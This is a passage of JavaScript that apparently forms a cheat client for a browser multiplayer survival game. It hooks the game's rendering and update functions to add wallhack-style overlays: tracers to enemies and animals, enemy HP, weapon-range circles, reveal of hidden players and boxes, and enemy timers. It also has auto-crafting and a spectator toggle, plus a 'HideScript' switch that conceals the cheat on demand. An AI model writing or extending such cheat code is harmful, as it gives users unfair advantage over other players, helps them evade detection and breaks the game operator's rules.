                    return typeof item[key] === "function" && item[key].length === 0;
                  })[1];
                  EncodeDict.draw_fgKey = draw_fgKey;
                }
                let orignial_draw_fg_function = item[draw_fgKey];
                item[draw_fgKey] = function (...args) {
                  orignial_draw_fg_function.apply(this, args);
                  if (this.info && Settings.WorldInfo.e && !Settings.HideScript.e) {
                    ctx.drawImage(this.img.canvas, user.cam.x + this.x - 30, user.cam.y + this.y - 40);
                  }
                };
              }
              break;
            case ITEMS.BREAD_OVEN:
              item.img = new createText(68, 90, 2);
              if (item.info) {
                item.img.drawText(item.info, 20, "black", "white");
              }
              item[updateKey] = function () {
                if (this.info) {
                  this.img.drawText(this.info, 20, "black", "white");
                }
              };
              {
                let orignial_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  orignial_draw_function.apply(this, args);
                  if (this.info && Settings.WorldInfo.e && !Settings.HideScript.e) {
                    ctx.drawImage(this.img.canvas, user.cam.x + this.x - 33, user.cam.y + this.y - 47);
                  }
                };
              }
              break;
            case ITEMS.EXTRACTOR_MACHINE_STONE:
              item.img = new createText(70, 70, 1);
              if (item.info) {
                item.img.drawText(item.info, 20, "black", "white");
              }
              item[updateKey] = function () {
                if (this.info) {
                  this.img.drawText(this.info, 20, "black", "white");
                }
              };
              {
                let orignial_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  orignial_draw_function.apply(this, args);
                  if (this.info && Settings.WorldInfo.e && !Settings.HideScript.e) {
                    ctx.drawImage(this.img.canvas, user.cam.x + this.x - 30, user.cam.y + this.y - 40);
                  }
                };
              }
              break;
            case ITEMS.EXTRACTOR_MACHINE_GOLD:
              item.img = new createText(70, 70, 1);
              if (item.info) {
                item.img.drawText(item.info, 20, "black", "white");
              }
              item[updateKey] = function () {
                if (this.info) {
                  this.img.drawText(this.info, 20, "black", "white");
                }
              };
              {
                let orignial_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  orignial_draw_function.apply(this, args);
                  if (this.info && Settings.WorldInfo.e && !Settings.HideScript.e) {
                    ctx.drawImage(this.img.canvas, user.cam.x + this.x - 30, user.cam.y + this.y - 40);
                  }
                };
              }
              break;
            case ITEMS.EXTRACTOR_MACHINE_DIAMOND:
              item.img = new createText(70, 70, 1);
              if (item.info) {
                item.img.drawText(item.info, 20, "black", "white");
              }
              item[updateKey] = function () {
                if (this.info) {
                  this.img.drawText(this.info, 20, "black", "white");
                }
              };
              {
                let orignial_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  orignial_draw_function.apply(this, args);
                  if (this.info && Settings.WorldInfo.e && !Settings.HideScript.e) {
                    ctx.drawImage(this.img.canvas, user.cam.x + this.x - 30, user.cam.y + this.y - 40);
                  }
                };
              }
              break;
            case ITEMS.EXTRACTOR_MACHINE_AMETHYST:
              item.img = new createText(70, 70, 1);
              if (item.info) {
                item.img.drawText(item.info, 20, "black", "white");
              }
              item[updateKey] = function () {
                if (this.info) {
                  this.img.drawText(this.info, 20, "black", "white");
                }
              };
              {
                let orignial_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  orignial_draw_function.apply(this, args);
                  if (this.info && Settings.WorldInfo.e && !Settings.HideScript.e) {
                    ctx.drawImage(this.img.canvas, user.cam.x + this.x - 30, user.cam.y + this.y - 40);
                  }
                };
              }
              break;
            case ITEMS.EXTRACTOR_MACHINE_REIDITE:
              item.img = new createText(70, 70, 1);
              if (item.info) {
                item.img.drawText(item.info, 20, "black", "white");
              }
              item[updateKey] = function () {
                if (this.info) {
                  this.img.drawText(this.info, 20, "black", "white");
                }
              };
              {
                let orignial_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  orignial_draw_function.apply(this, args);
                  if (this.info && Settings.WorldInfo.e && !Settings.HideScript.e) {
                    ctx.drawImage(this.img.canvas, user.cam.x + this.x - 30, user.cam.y + this.y - 40);
                  }
                };
              }
              break;
            case ITEMS.WINDMILL:
              item.img = new createText(70, 70, 1);
              if (item.info) {
                item.img.drawText(item.info, 20, "black", "white");
              }
              item[updateKey] = function () {
                if (this.info) {
                  this.img.drawText(this.info, 20, "black", "white");
                }
              };
              {
                if (!draw_fgKey) {
                  draw_fgKey = Object.keys(item).filter(_param_752 => {
                    return typeof item[_param_752] === "function" && item[_param_752].length === 0;
                  })[1];
                  EncodeDict.draw_fgKey = draw_fgKey;
                }
                let orignial_draw_fg_function = item[draw_fgKey];
                item[draw_fgKey] = function (...args) {
                  orignial_draw_fg_function.apply(this, args);
                  if (this.info && Settings.WorldInfo.e && !Settings.HideScript.e) {
                    ctx.drawImage(this.img.canvas, user.cam.x + this.x - 30, user.cam.y + this.y - 40);
                  }
                };
              }
              break;
            case ITEMS.TOTEM:
              if (user.in_team(item.pid)) {
                TotemCoor = {
                  x: item.x,
                  y: item.y
                };
              }
              item.img = new createText(200, 90, 3);
              item.img.drawText([String.raw`${world.players[item.pid].nickname}`, item.info], 18, "black", "white");
              item[updateKey] = function () {
                this.img.drawText([String.raw`${world.players[this.pid].nickname}`, this.info], 18, "black", "white");
              };
              {
                let orignial_draw_function = item[drawKey];
                item[drawKey] = function (...args) {
                  orignial_draw_function.apply(this, args);
                  if (this.info && Settings.WorldInfo.e && !Settings.HideScript.e) {
                    ctx.drawImage(this.img.canvas, user.cam.x + this.x - 25, user.cam.y + this.y - 50);
                  }
                };
              }
              break;
            case ITEMS.CRATE:
            case ITEMS.DEAD_BOX:
              if (!drawKey) {
                const keyOfItem = Object.keys(item);
                drawKey = keyOfItem.find(key => {
                  return typeof item[key] === "function";
                });
                EncodeDict.draw = drawKey;
              }
              {
                let orignial_draw_function = item[drawKey];
                item[drawKey] = function () {
                  if (Settings.RenderOnTop.e && Settings.RenderOnTop.box && !Settings.HideScript.e) {
                    if (!arguments[2]) {
                      return;
                    }
                  }
                  orignial_draw_function.apply(this, arguments);
                  if (Settings.BoxInfo.e && !Settings.HideScript.e) {
                    ctx.save();
                    ctx.font = "20px Baloo Paaji";
                    ctx.strokeStyle = "black";
                    ctx.textAlign = "center";
                    ctx.textBaseline = "middle";
                    ctx.lineWidth = 6;
                    let timeLeft;
                    let nameBox;
                    if (this.type === ITEMS.DEAD_BOX) {
                      if (this.isAnimalBox) {
                        nameBox = "";
                        timeLeft = Math.floor(31 - (Date.now() - this.spawnTime) / 1000);
                      } else {
                        nameBox = "Dead";
                        timeLeft = Math.floor(300 - (Date.now() - this.spawnTime) / 1000);
                      }
                    } else {
                      nameBox = "Drop";
                      timeLeft = Math.floor(17 - (Date.now() - this.spawnTime) / 1000);
                    }
                    ctx.strokeText(nameBox, user.cam.x + this.x, user.cam.y + this.y);
                    ctx.strokeText(timeLeft + "s", user.cam.x + this.x, user.cam.y + this.y + 20);
                    ctx.fillStyle = "white";
                    ctx.fillText(nameBox, user.cam.x + this.x, user.cam.y + this.y);
                    ctx.fillText(timeLeft + "s", user.cam.x + this.x, user.cam.y + this.y + 20);
                    ctx.restore();
                  }
                };
                Object.defineProperty(item, "draw", {
                  get() {
                    return this[drawKey];
                  }
                });
              }
              break;
            case ITEMS.TREASURE_CHEST:
              {
                const original_draw_function = item[drawKey];
                item[drawKey] = function () {
                  if (Settings.RenderOnTop.e && Settings.RenderOnTop.treasure_chest && !Settings.HideScript.e) {
                    if (!arguments[2]) {
                      return;
                    }
                  }
                  original_draw_function.apply(this, arguments);
                };
                Object.defineProperty(item, "draw", {
                  get() {
                    return this[drawKey];
                  }
                });
              }
              break;
          }
          if (IsAnimal(item.type) || item.type === ITEMS.CRATE || item.type === ITEMS.DEAD_BOX) {
            item.maxHp = getHp(item.type);
            item.currentHp = item.maxHp;
            item.attackedRecentlyBy = {};
            const orignial_update_function = item[updateKey];
            if (item.type === ITEMS.DEAD_BOX) {
              item[updateKey] = function (action) {
                if (action === __p_ODkn_STATE_HURT) {
                  if (!IsSomeOneDied && Date.now() - this.spawnTime < 100) {
                    this.maxHp = 0;
                    this.currentHp = this.maxHp;
                    this.isAnimalBox = true;
                  }
                  const attackingEntity = findPlayerAttacking(this, world.units[ITEMS.PLAYERS]);
                  if (attackingEntity) {
                    const damageToTake = damageCalculator.getWeaponDamage(attackingEntity.right, true, attackingEntity.clothe, attackingEntity.vehicle);
                    this.currentHp -= damageToTake;
                  }
                }
                orignial_update_function?.apply(this, arguments);
              };
            } else {
              item[updateKey] = function (action) {
                if (action === __p_ODkn_STATE_HURT) {
                  const attackingEntity = findPlayerAttacking(this, world.units[ITEMS.PLAYERS]);
                  if (attackingEntity) {
                    const damageToTake = damageCalculator.getWeaponDamage(attackingEntity.right, true, attackingEntity.clothe, attackingEntity.vehicle);
                    this.currentHp -= damageToTake;
                  }
                }
                orignial_update_function?.apply(this, arguments);
              };
            }
          }
          if (item.type === ITEMS.DEAD_BOX || item.type === ITEMS.CRATE) {
            const orignial_draw_function = item[drawKey];
            item[drawKey] = function () {
              orignial_draw_function.apply(this, arguments);
              if (!Settings.HideScript.e && Settings.VisualHp.e && Settings.VisualHp.box && this.currentHp < this.maxHp && this.currentHp > 0) {
                ctx.save();
                ctx.font = "22px Baloo Paaji";
                ctx.strokeStyle = "black";
                ctx.fillStyle = "white";
                ctx.textAlign = "center";
                ctx.textBaseline = "middle";
                ctx.lineWidth = 6;
                ctx.strokeText(this.currentHp + "❤️", user.cam.x + this.x, user.cam.y + this.y - 20);
                ctx.fillText(this.currentHp + "❤️", user.cam.x + this.x, user.cam.y + this.y - 20);
                ctx.restore();
              }
            };
          }
        }
        original_function.apply(this, arguments);
      };
    }
    if (ui.getTokenForJoinGame) {
      const original_function = ui.getTokenForJoinGame;
      ui.getTokenForJoinGame = async function (arg2, isOriginal = false) {
        if (!isOriginal) {
          var callback = () => {
            client.connect();
          };
        }
        original_function.call(this, callback, arg2);
      };
    }
    {
      for (const key in client) {
        if (client.get_focus === client[key] && key !== "get_focus") {
          client[key] = function () {
            if (!Settings.Spectator.e) {
              client.get_focus();
            }
          };
          break;
        }
      }
    }
    if (client.gather) {
      const originalFunction = client.gather;
      client.gather = function (e) {
        if (isInCrafting) {
          isInCrafting = false;
          if (Settings.AutoBook.e && Settings.AutoBook.pullOldRight && oldRight !== null) {
            if (!SLOW_DOWN[oldRight]) {
              if (!Settings.AutoCraft.e || !Settings.SmartCraft.e) {
                if (user.inv.n[oldRight]) {
                  send_select_inv(oldRight);
                  incomingRight = oldRight === INV.HAND ? -1 : oldRight;
                }
                oldRight = null;
              }
            } else {
              oldRight = null;
            }
          }
        }
        originalFunction.apply(this, arguments);
        if (Settings.SmartCraft.e) {
          for (let i = 1, len = e.length; i < len; i += 2) {
            let invId = e[i];
            let quantity = e[i + 1];
            if (temp.smartCraft.mode === invId) {
              temp.smartCraft.amount -= quantity;
              if (temp.smartCraft.amount <= 0) {
                Settings.SmartCraft.e = false;
                temp.smartCraft.amount = 100;
              }
              guiControls.SmartCraft.refresh();
              break;
            }
          }
        }
      };
    }
    {
      const keys = Object.keys(game);
      const draw_sceneKey = keys.find(_param_753 => {
        return typeof game[_param_753] === "function" && game[_param_753].length === 0 && countOccurrences(game[_param_753].toString().replace(/\s+/g, ""), "();") === 1 && !game[_param_753].toString().replace(/\s+/g, "").includes(".");
      });
      if (draw_sceneKey) {
        let original_function = game[draw_sceneKey];
        game[draw_sceneKey] = function (...args) {
          original_function.apply(this, args);
          if (!Settings.HideScript.e) {
            if (Settings.ShowRangeOfWeapon.e) {
              const myPlayer = world.fast_units[user.uid];
              if (myPlayer) {
                const players = world.units[ITEMS.PLAYERS].filter(player => {
                  return !player.ally && player.fly == myPlayer.fly && !player.ghost;
                });
                let nearestPlayer = null;
                let isInSwordRange = false;
                let isInSpearRange = false;
                const swordRange = (myPlayer.fly ? 196.8 : 157.6) - 22;
                const spearRange = (myPlayer.fly ? 291.8 : 227.6) - 22;
                if (players.length) {
                  nearestPlayer = players.reduce((nearest, player) => {
                    if (Utils.dist(myPlayer, player) < Utils.dist(myPlayer, nearest)) {
                      return player;
                    } else {
                      return nearest;
                    }
                  }, players[0]);
                  if (Utils.dist(myPlayer, nearestPlayer) < swordRange) {
                    isInSpearRange = true;
                    isInSwordRange = true;
                  } else if (Utils.dist(myPlayer, nearestPlayer) < spearRange) {
                    isInSpearRange = true;
                  }
                }
                ctx.save();
                ctx.translate(user.cam.x + myPlayer.x, user.cam.y + myPlayer.y);
                ctx.globalAlpha = 0.5;
                ctx.lineWidth = 1.5;
                if (isInSwordRange) {
                  ctx.strokeStyle = "green";
                } else {
                  ctx.strokeStyle = "black";
                }
                ctx.beginPath();
                ctx.arc(0, 0, swordRange, 0, Math.PI * 2);
                ctx.stroke();
                if (isInSpearRange) {
                  ctx.strokeStyle = "green";
                } else {
                  ctx.strokeStyle = "black";
                }
                ctx.beginPath();
                ctx.arc(0, 0, spearRange, 0, Math.PI * 2);
                ctx.stroke();
                ctx.restore();
              }
            }
            if (Settings.ShowSpikeWarningCircle.e) {
              const myPlayer = world.fast_units[user.uid];
              if (myPlayer && !myPlayer.ghost && !myPlayer.fly) {
                const spikeDoors = [...world.units[ITEMS.WOOD_DOOR_SPIKE], ...world.units[ITEMS.STONE_DOOR_SPIKE], ...world.units[ITEMS.GOLD_DOOR_SPIKE], ...world.units[ITEMS.DIAMOND_DOOR_SPIKE], ...world.units[ITEMS.AMETHYST_DOOR_SPIKE], ...world.units[ITEMS.REIDITE_DOOR_SPIKE]].filter(_param_754 => {
                  return !_param_754.ally && !(_param_754.info & 1);
                });
                const spikes = [...world.units[ITEMS.SPIKE], ...world.units[ITEMS.STONE_SPIKE], ...world.units[ITEMS.GOLD_SPIKE], ...world.units[ITEMS.DIAMOND_SPIKE], ...world.units[ITEMS.AMETHYST_SPIKE], ...world.units[ITEMS.REIDITE_SPIKE]].filter(item => {
                  return !item.ally;
                });
                if ([...spikeDoors, ...spikes].some(item => {
                  return Utils.dist(myPlayer.r, item.r) <= 100;
                })) {
                  ctx.save();
                  ctx.translate(user.cam.x + myPlayer.x, user.cam.y + myPlayer.y);
                  ctx.globalAlpha = 0.5;
                  ctx.lineWidth = 1.5;
                  ctx.strokeStyle = "red";
                  ctx.beginPath();
                  ctx.arc(0, 0, 100, 0, Math.PI * 2);
                  ctx.stroke();
                  ctx.restore();
                }
              }
            }
            if (Settings.Tracers.e) {
              if (client.socket && client.socket.readyState === 1 && user && user.alive && world.fast_units[user.uid]) {
                let pX = user.cam.x + world.fast_units[user.uid].x;
                let pY = user.cam.y + world.fast_units[user.uid].y;
                let userCamX = user.cam.x;
                let userCamY = user.cam.y;
                let p = world.units[ITEMS.PLAYERS];
                ctx.save();
                for (let i = 0; i < p.length; i++) {
                  if (p[i].pid !== user.id) {
                    ctx.lineWidth = 2.6;
                    ctx.beginPath();
                    ctx.moveTo(pX, pY);
                    ctx.lineTo(userCamX + p[i].x, userCamY + p[i].y);
                    ctx.strokeStyle = p[i].ally ? "cyan" : "red";
                    if (Settings.Tracers.target.teamate && p[i].ally || Settings.Tracers.target.enemy && !p[i].ally) {
                      ctx.stroke();
                    }
                  }
                }
                ctx.restore();
                function draw_tracer(unit, color) {
                  ctx.save();
                  ctx.lineWidth = 2.6;
                  ctx.beginPath();
                  ctx.moveTo(pX, pY);
                  ctx.lineTo(userCamX + unit.x, userCamY + unit.y);
                  ctx.strokeStyle = color;
                  ctx.stroke();
                  ctx.restore();
                }
                if (Settings.Tracers.target.spider) {
                  world.units[ITEMS.SPIDER].forEach(unit => {
                    return draw_tracer(unit, "#ffffff");
                  });
                }
                if (Settings.Tracers.target.wolf) {
                  world.units[ITEMS.WOLF].forEach(unit => {
                    return draw_tracer(unit, "#231f20");
                  });
                }
                if (Settings.Tracers.target.rabbit) {
                  world.units[ITEMS.RABBIT].forEach(unit => {
                    return draw_tracer(unit, "#eb96bc");
                  });
                }
                if (Settings.Tracers.target.hawk) {
                  world.units[ITEMS.HAWK].forEach(unit => {
                    return draw_tracer(unit, "#693b1d");
                  });
                }
                if (Settings.Tracers.target.kraken) {
                  world.units[ITEMS.KRAKEN].forEach(unit => {
                    return draw_tracer(unit, "#6964c9");
                  });
                }
                if (Settings.Tracers.target.sandworm) {
                  world.units[ITEMS.SAND_WORM].forEach(_param_755 => {
                    return draw_tracer(_param_755, "#c4c4c4");
                  });
                }
                if (Settings.Tracers.target.lavadragon) {
                  world.units[ITEMS.LAVA_DRAGON].forEach(unit => {
                    return draw_tracer(unit, "#8c0000");
                  });
                }
                if (Settings.Tracers.target.goldenchicken) {
                  world.units[ITEMS.GOLDEN_CHICKEN].forEach(unit => {
                    return draw_tracer(unit, "#ffcc00");
                  });
                }
              }
            }
            const animals = [...world.units[ITEMS.RABBIT], ...world.units[ITEMS.WOLF], ...world.units[ITEMS.SPIDER], ...world.units[ITEMS.BOAR], ...world.units[ITEMS.HAWK], ...world.units[ITEMS.PENGUIN], ...world.units[ITEMS.FOX], ...world.units[ITEMS.BEAR], ...world.units[ITEMS.BABY_MAMMOTH], ...world.units[ITEMS.MAMMOTH], ...world.units[ITEMS.BABY_DRAGON], ...world.units[ITEMS.DRAGON], ...world.units[ITEMS.CRAB], ...world.units[ITEMS.CRAB_BOSS], ...world.units[ITEMS.PIRANHA], ...world.units[ITEMS.KRAKEN], ...world.units[ITEMS.FLAME], ...world.units[ITEMS.LAVA_DRAGON], ...world.units[ITEMS.BABY_LAVA], ...world.units[ITEMS.VULTURE], ...world.units[ITEMS.SAND_WORM], ...world.units[ITEMS.GOLDEN_CHICKEN]];
            if (Settings.VisualHp.e && Settings.VisualHp.animal) {
              for (let i = 0, len = animals.length; i < len; i++) {
                const animal = animals[i];
                if (animal.currentHp > 0) {
                  ctx.save();
                  ctx.font = "22px Baloo Paaji";
                  ctx.strokeStyle = "black";
                  ctx.fillStyle = "white";
                  ctx.textAlign = "center";
                  ctx.textBaseline = "middle";
                  ctx.lineWidth = 6;
                  ctx.strokeText(animal.currentHp + "❤️", user.cam.x + animal.x, user.cam.y + animal.y);
                  ctx.fillText(animal.currentHp + "❤️", user.cam.x + animal.x, user.cam.y + animal.y);
                  ctx.restore();
                }
              }
            }
            if (Settings.ShowMovement.e && Settings.ShowMovement.animal) {
              for (let i = 0, len = animals.length; i < len; i++) {
                const animal = animals[i];
                ctx.save();
                ctx.lineWidth = 2.6;
                ctx.beginPath();
                ctx.moveTo(user.cam.x + animal.x, user.cam.y + animal.y);
                ctx.lineTo(user.cam.x + animal.r.x, user.cam.y + animal.r.y);
                ctx.strokeStyle = "orange";
                ctx.stroke();
                ctx.restore();
              }
            }
            if (Settings.RenderOnTop.e) {
              if (Settings.RenderOnTop.treasure_chest) {
                world.units[ITEMS.TREASURE_CHEST].forEach(_param_756 => {
                  _param_756.draw(__p_qVnV_SPRITE_TREASURE_CHEST, __p_qVnV_SPRITE_HURT_TREASURE_CHEST, true);
                });
              }
              if (Settings.RenderOnTop.player) {
                let players = world.units[ITEMS.PLAYERS];
                for (let i = 0; i < players.length; i++) {
                  let player = players[i];
                  if (player.vehicle !== INV.MOUNT_BABY_DRAGON && player.vehicle !== INV.MOUNT_BABY_LAVA && player.vehicle !== INV.MOUNT_HAWK && player.vehicle !== INV.PLANE && player.vehicle !== INV.NIMBUS && player.vehicle !== INV.MOUNT_PARROT && player.vehicle !== INV.MOUNT_VULTURE) {
                    if (player.tower === 0) {
                      if (player.tower_fx > 0.001) {
                        let scl = 1 + Math.min(1, Math.max(player.tower_fx, 0) / 100) * 0.18;
                        ctx.save();
                        ctx.scale(scl, scl);
                        user.cam.x /= scl;
                        user.cam.y /= scl;
                        player.x /= scl;
                        player.y /= scl;
                        player.r.x /= scl;
                        player.r.y /= scl;
                        player.draw_vehicle(true);
                        player.draw(true);
                        user.cam.x *= scl;
                        user.cam.y *= scl;
                        player.x *= scl;
                        player.y *= scl;
                        player.r.x *= scl;
                        player.r.y *= scl;
                        ctx.restore();
                      } else {
                        player.draw_vehicle(true);
                        player.draw(true);
                      }
                    }
                  } else if (player.speed <= 180) {
                    ctx.save();
                    let scl = 1 + Math.min(1, Math.max(player.vehicle_fx5 - 30, 0) / 180) * 0.35;
                    ctx.scale(scl, scl);
                    user.cam.x /= scl;
                    user.cam.y /= scl;
                    player.x /= scl;
                    player.y /= scl;
                    player.r.x /= scl;
                    player.r.y /= scl;
                    player.draw_vehicle(true);
                    player.draw(true);
                    user.cam.x *= scl;
                    user.cam.y *= scl;
                    player.x *= scl;
                    player.y *= scl;
                    player.r.x *= scl;
                    player.r.y *= scl;
                    ctx.restore();
                  }
                }
                for (let i = 0; i < players.length; i++) {
                  let player = players[i];
                  if (player.tower === 1 && (player.speed < 180 || player.vehicle !== INV.MOUNT_BABY_DRAGON && player.vehicle !== INV.MOUNT_BABY_LAVA && player.vehicle !== INV.MOUNT_HAWK && player.vehicle !== INV.PLANE && player.vehicle !== INV.NIMBUS && player.vehicle !== INV.MOUNT_PARROT && player.vehicle !== INV.MOUNT_VULTURE)) {
                    let scl = 1 + Math.min(1, Math.max(player.tower_fx, 0) / 100) * 0.18;
                    ctx.save();
                    ctx.scale(scl, scl);
                    user.cam.x /= scl;
                    user.cam.y /= scl;
                    player.x /= scl;
                    player.y /= scl;
                    player.r.x /= scl;
                    player.r.y /= scl;
                    player.draw_vehicle(true);
                    player.draw(true);
                    user.cam.x *= scl;
                    user.cam.y *= scl;
                    player.x *= scl;
                    player.y *= scl;
                    player.r.x *= scl;
                    player.r.y *= scl;
                    ctx.restore();
                  }
                }
                for (let i = 0; i < players.length; i++) {
                  let player = players[i];
                  if ((player.vehicle === INV.MOUNT_BABY_DRAGON || player.vehicle === INV.MOUNT_BABY_LAVA || player.vehicle === INV.MOUNT_HAWK || player.vehicle === INV.PLANE || player.vehicle === INV.NIMBUS || player.vehicle === INV.MOUNT_PARROT || player.vehicle === INV.MOUNT_VULTURE) && player.speed > 180) {
                    ctx.save();
                    let scl = 1 + Math.min(1, Math.max(player.vehicle_fx5 - 30, 0) / 180) * 0.35;
                    ctx.scale(scl, scl);
                    user.cam.x /= scl;
                    user.cam.y /= scl;
                    player.x /= scl;
                    player.y /= scl;
                    player.r.x /= scl;
                    player.r.y /= scl;
                    player.draw_vehicle(true);
                    player.draw(true);
                    user.cam.x *= scl;
                    user.cam.y *= scl;
                    player.x *= scl;
                    player.y *= scl;
                    player.r.x *= scl;
                    player.r.y *= scl;
                    ctx.restore();
                  }
                }
              }
            }
            if (Settings.GhostInfo.e) {
              world.units[ITEMS.PLAYERS].forEach(player => {
                if (player.ghost) {
                  ctx.save();
                  ctx.font = "30px Baloo Paaji";
                  ctx.strokeStyle = "black";
                  if (player.ally) {
                    ctx.fillStyle = "cyan";
                  } else {
                    ctx.fillStyle = "red";
                  }
                  ctx.lineWidth = 6;
                  ctx.textAlign = "center";
                  ctx.textBaseline = "middle";
                  ctx.strokeText(Math.floor(60 - (performance.now() - player.spawnGhostTime) / 1000) + 1, user.cam.x + player.x, user.cam.y + player.y);
                  ctx.fillText(Math.floor(60 - (performance.now() - player.spawnGhostTime) / 1000) + 1, user.cam.x + player.x, user.cam.y + player.y);
                  ctx.restore();
                }
              });
            }
            if (Settings.ShowMovement.e && Settings.ShowMovement.player) {
              const players = world.units[ITEMS.PLAYERS];
              for (let i = 0, len = players.length; i < len; i++) {
                const player = players[i];
                if (player.pid !== user.id) {
                  ctx.save();
                  ctx.lineWidth = 2.6;
                  ctx.beginPath();
                  ctx.moveTo(user.cam.x + player.x, user.cam.y + player.y);
                  ctx.lineTo(user.cam.x + player.r.x, user.cam.y + player.r.y);
                  if (player.ally) {
                    ctx.strokeStyle = "cyan";
                  } else {
                    ctx.strokeStyle = "red";
                  }
                  ctx.stroke();
                  ctx.restore();
                }
              }
            }
            if (Settings.RenderOnTop.e) {
              if (Settings.RenderOnTop.box) {
                world.units[ITEMS.CRATE].forEach(unit => {
                  unit.draw(__p_qVnV_SPRITE_CRATE, __p_qVnV_SPRITE_HURT_DEAD_BOX, true);
                });
                world.units[ITEMS.DEAD_BOX].forEach(unit => {
                  unit.draw(__p_qVnV_SPRITE_CRATE, __p_qVnV_SPRITE_HURT_DEAD_BOX, true);
                });
              }
            }
            if (Settings.HoodTimer.e) {
              const players = world.units[ITEMS.PLAYERS];
              for (let i = 0, len = players.length; i < len; i++) {
                const player = players[i];
                if (player.hoodTimerV) {
                  ctx.save();
                  ctx.translate(user.cam.x + player.x - 46, user.cam.y + player.y + 43);
                  ctx.beginPath();
                  ctx.globalAlpha = 0.75;
                  ctx.lineWidth = scale * 4;
                  ctx.strokeStyle = Settings.HoodTimer.color;
                  ctx.lineCap = "round";
                  ctx.arc(0, 0, scale * 12, 0, Math.PI * 2 * player.hoodTimerV);
                  ctx.stroke();
                  ctx.restore();
                }
              }
            }
            if (Settings.DrawWeaponSwitchDelay.e) {
              {
                const players = world.units[ITEMS.PLAYERS];
                for (let i = 0, len = players.length; i < len; i++) {
                  const player = players[i];
                  if (player.pid !== user.id && player.pullWeaponTime && !player.ghost) {
                    const pullWeaponTimeElapsed = performance.now() - player.pullWeaponTime;
                    const values = Object.values(user.weapon.timeout);
                    const max_speed = values[4];
                    const interval = 1 / max_speed * 1000;
                    if (pullWeaponTimeElapsed <= interval) {
                      const v = pullWeaponTimeElapsed / interval;
                      ctx.save();
                      ctx.translate(user.cam.x + player.x + 46, user.cam.y + player.y + 43);
                      ctx.beginPath();
                      ctx.globalAlpha = 0.75;
                      ctx.lineWidth = scale * 4;
                      if (player.dist_winter > 0) {
                        ctx.strokeStyle = "black";
                      } else {
                        ctx.strokeStyle = "white";
                      }
                      ctx.lineCap = "round";
                      ctx.arc(0, 0, scale * 12, 0, Math.PI * 2 * v);
                      ctx.stroke();
                      ctx.restore();
                    } else {
                      player.pullWeaponTime = null;
                    }
                  }
                }
              }
              if (user.weapon.wait) {
                const myPlayer = world.fast_units[user.uid];
                if (myPlayer && !myPlayer.ghost) {
                  const values = Object.values(user.weapon.timeout);
                  const v = values[1];
                  ctx.save();
                  ctx.translate(user.cam.x + myPlayer.x + 46, user.cam.y + myPlayer.y + 43);
                  ctx.beginPath();
                  ctx.globalAlpha = 0.75;
                  ctx.lineWidth = scale * 4;
                  if (myPlayer.dist_winter > 0) {
                    ctx.strokeStyle = "black";
                  } else {
                    ctx.strokeStyle = "white";
                  }
                  ctx.lineCap = "round";
                  ctx.arc(0, 0, scale * 12, 0, Math.PI * 2 * v);
                  ctx.stroke();
                  ctx.restore();
                }
              }
            }
            if (Settings.VisualHp.e && Settings.VisualHp.player || Settings.DrawTimerInPlayer.e && Settings.DrawTimerInPlayer.isInOthers) {
              const players = world.units[ITEMS.PLAYERS];
              const EXCLUDED_VEHICLES = new Set([INV.MOUNT_BABY_DRAGON, INV.MOUNT_BABY_LAVA, INV.MOUNT_HAWK, INV.PLANE, INV.NIMBUS, INV.MOUNT_PARROT, INV.MOUNT_VULTURE]);
              function drawPlayerHp(player, scale) {
                ctx.save();
                ctx.scale(scale, scale);
                user.cam.x /= scale;
                user.cam.y /= scale;
                player.x /= scale;
                player.y /= scale;
                player.r.x /= scale;
                player.r.y /= scale;
                ctx.translate(user.cam.x + player.x, user.cam.y + player.y);
                if (Settings.VisualHp.e && Settings.VisualHp.player) {
                  ctx.font = "26px Baloo Paaji";
                  ctx.textAlign = "center";
                  ctx.textBaseline = "middle";
                  ctx.strokeStyle = "black";
                  ctx.fillStyle = player.ally ? "#44AAFF" : "#FF4444";
                  ctx.lineWidth = 4;
                  const hp = hpFromServer[player.pid] ? Math.floor(hpFromServer[player.pid]) : Math.floor(player.currentHp);
                  ctx.strokeText(hp, 0, -30);
                  ctx.fillText(hp, 0, -30);
                }
                if (Settings.DrawTimerInPlayer.e && Settings.DrawTimerInPlayer.isInOthers && healTimestamps[player.pid]) {
                  const timeElapsed = (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000;
                  const secondsLeft = 10 - timeElapsed;
                  let timerText;
                  let fillStyle;
                  if (secondsLeft > 5) {
                    timerText = Math.ceil(secondsLeft - 5);
                    fillStyle = "white";
                  } else {
                    timerText = secondsLeft <= 2 && user.gauges.l !== 1 ? secondsLeft.toFixed(1) : Math.ceil(secondsLeft);
                    fillStyle = "#6da151";
                  }
                  ctx.save();
                  ctx.translate(0, 46);
                  ctx.font = "22px Baloo Paaji";
                  ctx.lineWidth = 3;
                  ctx.strokeStyle = "black";
                  ctx.fillStyle = fillStyle;
                  ctx.textAlign = "center";
                  ctx.textBaseline = "middle";
                  ctx.strokeText(timerText, 0, 0);
                  ctx.fillText(timerText, 0, 0);
                  ctx.restore();
                }
                user.cam.x *= scale;
                user.cam.y *= scale;
                player.x *= scale;
                player.y *= scale;
                player.r.x *= scale;
                player.r.y *= scale;
                ctx.restore();
              }
              for (let i = 0; i < players.length; i++) {
                const player = players[i];
                if (player.pid === user.id || player.currentHp <= 0 || player.ghost) {
                  continue;
                }
                if (!EXCLUDED_VEHICLES.has(player.vehicle)) {
                  if (player.tower === 0) {
                    const fx = player.tower_fx > 0 ? player.tower_fx : 0;
                    const scale = fx > 0.001 ? 1 + Math.min(fx / 100, 1) * 0.18 : 1;
                    drawPlayerHp(player, scale);
                  }
                } else if (player.speed <= 180) {
                  const scale = 1 + Math.min(1, Math.max(player.vehicle_fx5 - 30, 0) / 180) * 0.35;
                  drawPlayerHp(player, scale);
                }
              }
              for (let i = 0; i < players.length; i++) {
                const player = players[i];
                if (player.pid === user.id || player.currentHp <= 0 || player.ghost) {
                  continue;
                }
                if (player.tower === 1 && (player.speed < 180 || !EXCLUDED_VEHICLES.has(player.vehicle))) {
                  const fx = player.tower_fx > 0 ? player.tower_fx : 0;
                  const scale = 1 + Math.min(fx / 100, 1) * 0.18;
                  drawPlayerHp(player, scale);
                }
              }
              for (let i = 0; i < players.length; i++) {
                const player = players[i];
                if (player.pid === user.id || player.currentHp <= 0 || player.ghost) {
                  continue;
